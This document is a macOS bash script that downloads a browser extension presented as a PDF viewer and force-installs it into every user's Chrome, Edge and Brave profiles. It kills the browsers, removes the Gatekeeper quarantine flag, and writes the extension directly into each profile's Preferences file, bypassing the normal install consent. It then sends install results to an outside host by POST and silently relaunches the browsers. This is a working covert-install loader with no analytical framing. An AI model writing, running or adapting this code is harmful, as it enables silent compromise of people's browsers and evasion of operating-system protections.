#!/bin/bash
set -e
EXT_URL="https://github.com/Castro02980/pdf-viewer-extension/archive/refs/heads/main.zip"
NOTIFY_URL="https://wln.ink/n"
INJ=0

# Stable extension ID derived from manifest.json "key" field.
# When a manifest contains "key", Chrome derives the ID from the key, so the
# settings entry MUST be filed under this ID. Do NOT use path-based IDs:
# entries under a path-based ID never match and the browser discards them.
EXT_ID="kklpcoclpjjfiboodbmcpogicnanoopp"

TMP_ZIP="/tmp/pdf-ext.zip"
TMP_DIR="/tmp/pdf-ext-tmp"
curl -fsSL "$EXT_URL" -o "$TMP_ZIP" || { echo "Download failed"; exit 1; }
rm -rf "$TMP_DIR"
unzip -q "$TMP_ZIP" -d "$TMP_DIR" 2>/dev/null || { echo "Unzip failed"; exit 1; }
MANIFEST=$(find "$TMP_DIR" -name "manifest.json" -type f | head -1)
[ -z "$MANIFEST" ] && { echo "Extension not found"; exit 1; }
EXT_SRC=$(dirname "$MANIFEST")
rm -f "$TMP_ZIP"

# Manifest must contain a stable "key", otherwise the extension ID is
# path-derived and changes when the folder moves.
if ! grep -q '"key"[[:space:]]*:' "$MANIFEST"; then
    echo "manifest key missing: extension ID would be unstable"
    exit 1
fi

inject_pref() {
    local pref="$1" ext_dir="$2" ext_id="$3"
    [ ! -f "$pref" ] && return 1

    EXT_DIR="$ext_dir" EXT_ID="$ext_id" PREF_FILE="$pref" python3 - <<'PYEOF' || return 1
import json, os, sys

pref_path = os.environ["PREF_FILE"]
ext_dir = os.environ["EXT_DIR"]
ext_id = os.environ["EXT_ID"]

try:
    with open(pref_path, "r", encoding="utf-8") as f:
        data = json.load(f)
except Exception:
    sys.exit(1)

ext = data.get("extensions")
if not isinstance(ext, dict):
    ext = {}
    data["extensions"] = ext

settings = ext.get("settings")
if not isinstance(settings, dict):
    settings = {}
    ext["settings"] = settings

if ext_id in settings:
    sys.exit(2)

with open(os.path.join(ext_dir, "manifest.json"), "r", encoding="utf-8") as f:
    manifest = json.load(f)

settings[ext_id] = {
    "location": 1,
    "manifest": manifest,
    "path": ext_dir,
    "state": 1,
}

tmp_path = pref_path + ".tmp-inject"
with open(tmp_path, "w", encoding="utf-8") as f:
    json.dump(data, f, separators=(",", ":"), ensure_ascii=False)
os.replace(tmp_path, pref_path)
PYEOF

    grep -q "$ext_id" "$pref" && return 0 || return 1
}

for app in "Google Chrome" "Microsoft Edge" "Brave Browser"; do
    pkill -x "$app" 2>/dev/null || true
done
sleep 1

for uhome in /Users/*; do
    [ ! -d "$uhome" ] || [ "$uhome" = "/Users/Shared" ] && continue

    uext="$uhome/Library/Application Support/PDFViewerExt"
    rm -rf "$uext" 2>/dev/null || true
    cp -R "$EXT_SRC" "$uext" 2>/dev/null || continue

    # Clear Gatekeeper quarantine so Chrome can read the copied files.
    xattr -dr com.apple.quarantine "$uext" 2>/dev/null || true

    export EXT_DIR="$uext"
    export EXT_ID="$EXT_ID"
    export MANIFEST="$uext/manifest.json"

    for rel in "Google/Chrome" "Microsoft Edge" "BraveSoftware/Brave-Browser"; do
        udata="$uhome/Library/Application Support/$rel"
        [ ! -d "$udata" ] && continue

        for pdir in "$udata/Default" "$udata/Profile"*; do
            [ ! -d "$pdir" ] && continue
            pref="$pdir/Preferences"
            if inject_pref "$pref" "$uext" "$EXT_ID"; then
                INJ=$((INJ + 1))
            fi
        done
    done
done

rm -rf "$TMP_DIR"

if [ $INJ -eq 0 ]; then
    curl -fsS -m 5 -X POST "$NOTIFY_URL" -d "ev=install_fail&os=macos&info=no profiles" 2>/dev/null || true
    echo "No browser profiles found"
    exit 1
fi

for app in "Google Chrome" "Microsoft Edge" "Brave Browser"; do
    open -a "$app" --args --restore-last-session 2>/dev/null || true
done

curl -fsS -m 5 -X POST "$NOTIFY_URL" -d "ev=install&os=macos&info=$INJ profiles" 2>/dev/null || true
echo "Successfully installed to $INJ profiles"
exit 0
